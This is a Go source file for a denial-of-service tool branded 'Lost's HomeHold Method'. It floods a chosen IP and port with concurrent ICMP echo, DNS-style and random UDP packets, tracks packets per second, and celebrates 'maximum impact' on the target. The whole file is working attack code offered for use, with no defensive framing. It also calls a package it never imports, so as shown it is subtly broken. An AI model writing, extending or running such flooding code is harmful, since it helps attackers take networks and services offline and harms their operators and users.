package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"sync/atomic"
	"syscall"
	"time"
)

type FloodStats struct {
	packetsSent int64
	bytesSent   int64
	icmpCount   int64
	dnsCount    int64
	rawCount    int64
	startTime   time.Time
}

var (
	stats      FloodStats
	stopSignal int32
)

func main() {
	if len(os.Args) != 4 {
		fmt.Printf("Usage: %s <ip> <port> <time>\n", os.Args[0])
		fmt.Println("Example: ./homehold 192.168.1.1 80 60")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration, err := time.ParseDuration(os.Args[3] + "s")
	if err != nil {
		fmt.Printf("Invalid time format: %v\n", err)
		os.Exit(1)
	}

	if net.ParseIP(targetIP) == nil {
		fmt.Printf("Invalid IP address: %s\n", targetIP)
		os.Exit(1)
	}

	port, _ := strconv.Atoi(targetPort)

	// Display banner
	displayBanner()

	fmt.Printf("Target: %s:%d | Duration: %v\n", targetIP, port, duration)
	fmt.Println("Press Ctrl+C to stop")

	stats.startTime = time.Now()
	setupSignalHandler()

	startHouseHoldFlood(targetIP, port, duration)
	printFinalStats()
}

func displayBanner() {
	fmt.Println(`
==================
Lost's HomeHold Method
==================
Made by Spring / Chewz
==================
	`)
}

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("\nStopping HomeHold Flood...")
		atomic.StoreInt32(&stopSignal, 1)
		time.Sleep(2 * time.Second)
		printFinalStats()
		os.Exit(0)
	}()
}

func startHouseHoldFlood(targetIP string, targetPort int, duration time.Duration) {
	fmt.Println("Starting HomeHold UDP Flood with ICMP & DNS...")
	
	// Start multiple workers for different protocols
	workers := 50
	for i := 0; i < workers; i++ {
		go householdWorker(targetIP, targetPort, duration)
	}

	// Start stats printer
	go statsPrinter()

	// Wait for duration
	time.Sleep(duration)
	atomic.StoreInt32(&stopSignal, 1)
	time.Sleep(3 * time.Second)
}

func householdWorker(targetIP string, targetPort int, duration time.Duration) {
	timeout := time.After(duration)
	
	for {
		select {
		case <-timeout:
			return
		default:
			if atomic.LoadInt32(&stopSignal) == 1 {
				return
			}

			// Randomly choose attack method
			method := rand.Intn(100)
			switch {
			case method < 40: // 40% ICMP flood
				sendICMPFlood(targetIP)
			case method < 70: // 30% DNS flood
				sendDNSFlood(targetIP, targetPort)
			default: // 30% Raw UDP flood
				sendRawUDPFlood(targetIP, targetPort)
			}

			// Small delay to prevent overwhelming
			time.Sleep(time.Microsecond * 10)
		}
	}
}

func sendICMPFlood(targetIP string) {
	// Create raw socket for ICMP
	conn, err := net.Dial("ip4:icmp", targetIP)
	if err != nil {
		return
	}
	defer conn.Close()

	// Create ICMP echo request
	icmpData := createICMPPacket()
	
	// Send multiple ICMP packets
	for i := 0; i < 5; i++ {
		if atomic.LoadInt32(&stopSignal) == 1 {
			return
		}
		_, err := conn.Write(icmpData)
		if err == nil {
			atomic.AddInt64(&stats.packetsSent, 1)
			atomic.AddInt64(&stats.bytesSent, int64(len(icmpData)))
			atomic.AddInt64(&stats.icmpCount, 1)
		}
	}
}

func createICMPPacket() []byte {
	// ICMP Echo Request
	packet := make([]byte, 64)
	
	// Type: Echo Request (8), Code: 0
	packet[0] = 8
	packet[1] = 0
	
	// Checksum (will be calculated by system)
	packet[2] = 0
	packet[3] = 0
	
	// Identifier
	ident := uint16(rand.Intn(65535))
	packet[4] = byte(ident >> 8)
	packet[5] = byte(ident)
	
	// Sequence Number
	seq := uint16(rand.Intn(65535))
	packet[6] = byte(seq >> 8)
	packet[7] = byte(seq)
	
	// Data payload with random content
	rand.Read(packet[8:])
	
	return packet
}

func sendDNSFlood(targetIP string, targetPort int) {
	// Create UDP connection for DNS
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
	if err != nil {
		return
	}
	defer conn.Close()

	// Send multiple DNS-like packets
	for i := 0; i < 3; i++ {
		if atomic.LoadInt32(&stopSignal) == 1 {
			return
		}
		
		dnsData := createDNSPacket()
		_, err := conn.Write(dnsData)
		if err == nil {
			atomic.AddInt64(&stats.packetsSent, 1)
			atomic.AddInt64(&stats.bytesSent, int64(len(dnsData)))
			atomic.AddInt64(&stats.dnsCount, 1)
		}
	}
}

func createDNSPacket() []byte {
	// DNS-like packet with random queries
	packet := make([]byte, 512)
	
	// Transaction ID (random)
	txid := uint16(rand.Intn(65535))
	packet[0] = byte(txid >> 8)
	packet[1] = byte(txid)
	
	// Flags: Standard query
	packet[2] = 0x01 // QR=0, Opcode=0
	packet[3] = 0x00 // AA=0, TC=0, RD=0, RA=0, Z=0, RCODE=0
	
	// Questions: 1
	packet[4] = 0x00
	packet[5] = 0x01
	
	// Answer RRs: 0
	packet[6] = 0x00
	packet[7] = 0x00
	
	// Authority RRs: 0
	packet[8] = 0x00
	packet[9] = 0x00
	
	// Additional RRs: 0
	packet[10] = 0x00
	packet[11] = 0x00
	
	// Query: Random domain name
	domains := []string{
		"google.com", "facebook.com", "youtube.com", "amazon.com",
		"reddit.com", "twitter.com", "instagram.com", "netflix.com",
		"microsoft.com", "apple.com", "cloudflare.com", "akamai.com",
	}
	
	domain := domains[rand.Intn(len(domains))]
	offset := 12
	
	// Write domain name
	parts := strings.Split(domain, ".")
	for _, part := range parts {
		packet[offset] = byte(len(part))
		offset++
		copy(packet[offset:offset+len(part)], part)
		offset += len(part)
	}
	packet[offset] = 0x00 // End of domain name
	offset++
	
	// Type: A record (1)
	packet[offset] = 0x00
	packet[offset+1] = 0x01
	offset += 2
	
	// Class: IN (1)
	packet[offset] = 0x00
	packet[offset+1] = 0x01
	
	return packet[:offset+2]
}

func sendRawUDPFlood(targetIP string, targetPort int) {
	// Create UDP connection
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
	if err != nil {
		return
	}
	defer conn.Close()

	// Send multiple UDP packets with random data
	for i := 0; i < 4; i++ {
		if atomic.LoadInt32(&stopSignal) == 1 {
			return
		}
		
		udpData := createRandomUDPData()
		_, err := conn.Write(udpData)
		if err == nil {
			atomic.AddInt64(&stats.packetsSent, 1)
			atomic.AddInt64(&stats.bytesSent, int64(len(udpData)))
			atomic.AddInt64(&stats.rawCount, 1)
		}
	}
}

func createRandomUDPData() []byte {
	// Create random UDP payload
	sizes := []int{64, 128, 256, 512, 1024, 1450}
	size := sizes[rand.Intn(len(sizes))]
	
	data := make([]byte, size)
	rand.Read(data)
	
	// Mix in some protocol-like data
	protocols := [][]byte{
		[]byte("GET / HTTP/1.1\r\n"),
		[]byte("POST /api/v1/data HTTP/1.1\r\n"),
		[]byte("SSH-2.0-OpenSSH_8.2\r\n"),
		[]byte("\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03"), // TLS handshake
		[]byte("\x13\x00\x00\x00\x00\x00\x00\x00\x00"), // Some binary protocol
	}
	
	if rand.Float32() < 0.3 {
		proto := protocols[rand.Intn(len(protocols))]
		if len(proto) <= size {
			copy(data, proto)
		}
	}
	
	return data
}

func statsPrinter() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if atomic.LoadInt32(&stopSignal) == 1 {
				return
			}
			printStats()
		}
	}
}

func printStats() {
	packets := atomic.LoadInt64(&stats.packetsSent)
	bytes := atomic.LoadInt64(&stats.bytesSent)
	icmp := atomic.LoadInt64(&stats.icmpCount)
	dns := atomic.LoadInt64(&stats.dnsCount)
	raw := atomic.LoadInt64(&stats.rawCount)
	duration := time.Since(stats.startTime)
	
	pps := float64(packets) / duration.Seconds()
	mbps := (float64(bytes) * 8) / duration.Seconds() / 1000000

	fmt.Printf("\r[HomeHold] Packets: %d | PPS: %.0f | MBps: %.2f | ICMP: %d | DNS: %d | RAW: %d | Time: %v", 
		packets, pps, mbps, icmp, dns, raw, duration.Round(time.Second))
}

func printFinalStats() {
	packets := atomic.LoadInt64(&stats.packetsSent)
	bytes := atomic.LoadInt64(&stats.bytesSent)
	icmp := atomic.LoadInt64(&stats.icmpCount)
	dns := atomic.LoadInt64(&stats.dnsCount)
	raw := atomic.LoadInt64(&stats.rawCount)
	duration := time.Since(stats.startTime)
	
	pps := float64(packets) / duration.Seconds()
	mbps := (float64(bytes) * 8) / duration.Seconds() / 1000000

	fmt.Println("\n\n=== HomeHold Final Statistics ===")
	fmt.Printf("Total Duration: %v\n", duration.Round(time.Second))
	fmt.Printf("Total Packets Sent: %d\n", packets)
	fmt.Printf("Total Bytes Sent: %.2f MB\n", float64(bytes)/1024/1024)
	fmt.Printf("Average PPS: %.0f packets/second\n", pps)
	fmt.Printf("Average Throughput: %.2f Mbps\n", mbps)
	fmt.Printf("ICMP Packets: %d\n", icmp)
	fmt.Printf("DNS Packets: %d\n", dns)
	fmt.Printf("RAW UDP Packets: %d\n", raw)
	fmt.Printf("Packet Distribution: ICMP:%.1f%% DNS:%.1f%% RAW:%.1f%%\n",
		float64(icmp)/float64(packets)*100,
		float64(dns)/float64(packets)*100,
		float64(raw)/float64(packets)*100)
	
	if pps > 10000 {
		fmt.Println("Status: EXTREME FLOOD - Maximum impact achieved! 🚀")
	} else if pps > 5000 {
		fmt.Println("Status: HEAVY FLOOD - Strong network impact! 🔥")
	} else {
		fmt.Println("Status: GOOD FLOOD - Target is being saturated! 💪")
	}
}
